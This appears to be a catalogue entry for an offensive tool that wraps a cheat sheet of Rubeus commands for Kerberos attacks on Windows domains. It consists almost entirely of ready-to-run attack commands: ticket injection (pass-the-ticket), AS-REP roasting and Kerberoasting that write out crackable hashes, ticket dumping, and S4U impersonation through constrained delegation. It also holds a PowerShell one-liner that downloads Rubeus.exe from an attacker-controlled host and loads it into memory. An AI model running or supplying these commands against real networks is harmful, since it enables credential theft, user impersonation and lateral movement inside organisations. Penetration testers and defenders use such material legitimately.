---
trust_level: community
id: darkiros-rubeus
namespace: darkiros:tool:rubeus
name: rubeus
description: Rubeus - inject ticket from file
version: 1.0.0
capabilities:
- network.connect.remote
- security.execution.exploit
- security.execution.post-exploitation
- utility.generic
platforms:
- cross-platform
techniques:
- execution
- lateral-movement
execution:
  template: rubeus
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: Rubeus - inject ticket from file
  command: Rubeus.exe ptt /ticket:<ticket>
- description: Rubeus - load from powershell
  command: $data = (New-Object System.Net.WebClient).DownloadData('http://[lhost]/Rubeus.exe');$assem
    = [System.Reflection.Assembly]::Load($data);
- description: Rubeus - execute from powershell
  command: '[Rubeus.Program]::MainString(\"klist\");'
- description: Rubeus - monitor
  command: Rubeus.exe monitor /interval:5 /filteruser:[machine_account]
- description: Rubeus - inject ticket from b64 blob
  command: Rubeus.exe ptt /ticket:<base64_ticket>
- description: Rubeus - ASREP Roasting for all users in current domain
  command: Rubeus.exe asreproast /format:[AS_REP_response_format] /outfile:hashes.txt
- description: Rubeus - ASREP Roasting for a specific user
  command: Rubeus.exe asreproast /user:[username] /domain:[domain] /format:[AS_REP_response_format]
    /outfile:hashes.txt
- description: Rubeus - Kerberoasting current domain
  command: Rubeus.exe kerberoast /outfile:hashes.txt [/rc4opsec] [/aes]
- description: Rubeus - Kerberoasting specific user
  command: Rubeus.exe kerberoast /user:[username] /domain:[domain] /outfile:hashes.txt
    /simple
- description: Rubeus - get hash from user
  command: Rubeus.exe hash /user:[username] /domain:[domain] /password:[password]
- description: Rubeus - dump tickets
  command: Rubeus.exe dump
- description: Rubeus - ask and inject ticket
  command: Rubeus.exe asktgt /user:[username] /domain:[domain] /rc4:[ntlm-hash] /ptt
- description: Rubeus - S4U with ticket constrained delegation
  command: Rubeus.exe s4u /ticket:[ticket] /impersonateuser:[user] /msdsspn:ldap/[domain_fqdn]
    /altservice:cifs /ptt
- description: Rubeus - S4U with hash constrained delegation
  command: Rubeus.exe s4u /user:[user] /rc4:[ntlm-hash] /impersonateuser:[user] /msdsspn:ldap/[domain_fqdn]
    /altservice:cifs /domain:[domain_fqdn] /ptt
- description: Rubeus - get rc4 of machine with the password
  command: Rubeus.exe hash /password:[password]
references:
- label: Source
  url: https://github.com/GhostPack/Rubeus
- label: Darkiros
  url: https://darkiros.github.io/commands.html
items:
- TGS
- TGT
- Hash
services:
- Kerberos
features:
- file-system
- local
- network-intensive
- pipes-stdin
- remote
- stealth
---

# rubeus

Darkiros cheat sheet commands:

**Rubeus - inject ticket from file**
```
Rubeus.exe ptt /ticket:<ticket>
```

**Rubeus - load from powershell**
```
$data = (New-Object System.Net.WebClient).DownloadData('http://[lhost]/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
```

**Rubeus - execute from powershell**
```
[Rubeus.Program]::MainString(\"klist\");
```

**Rubeus - monitor**
```
Rubeus.exe monitor /interval:5 /filteruser:[machine_account]
```

**Rubeus - inject ticket from b64 blob**
```
Rubeus.exe ptt /ticket:<base64_ticket>
```

**Rubeus - ASREP Roasting for all users in current domain**
```
Rubeus.exe asreproast /format:[AS_REP_response_format] /outfile:hashes.txt
```

**Rubeus - ASREP Roasting for a specific user**
```
Rubeus.exe asreproast /user:[username] /domain:[domain] /format:[AS_REP_response_format] /outfile:hashes.txt
```

**Rubeus - Kerberoasting current domain**
```
Rubeus.exe kerberoast /outfile:hashes.txt [/rc4opsec] [/aes]
```

**Rubeus - Kerberoasting specific user**
```
Rubeus.exe kerberoast /user:[username] /domain:[domain] /outfile:hashes.txt /simple
```

**Rubeus - get hash from user**
```
Rubeus.exe hash /user:[username] /domain:[domain] /password:[password]
```

**Rubeus - dump tickets**
```
Rubeus.exe dump
```

**Rubeus - ask and inject ticket**
```
Rubeus.exe asktgt /user:[username] /domain:[domain] /rc4:[ntlm-hash] /ptt
```

**Rubeus - S4U with ticket constrained delegation**
```
Rubeus.exe s4u /ticket:[ticket] /impersonateuser:[user] /msdsspn:ldap/[domain_fqdn] /altservice:cifs /ptt
```

**Rubeus - S4U with hash constrained delegation**
```
Rubeus.exe s4u /user:[user] /rc4:[ntlm-hash] /impersonateuser:[user] /msdsspn:ldap/[domain_fqdn] /altservice:cifs /domain:[domain_fqdn] /ptt
```

**Rubeus - get rc4 of machine with the password**
```
Rubeus.exe hash /password:[password]
```
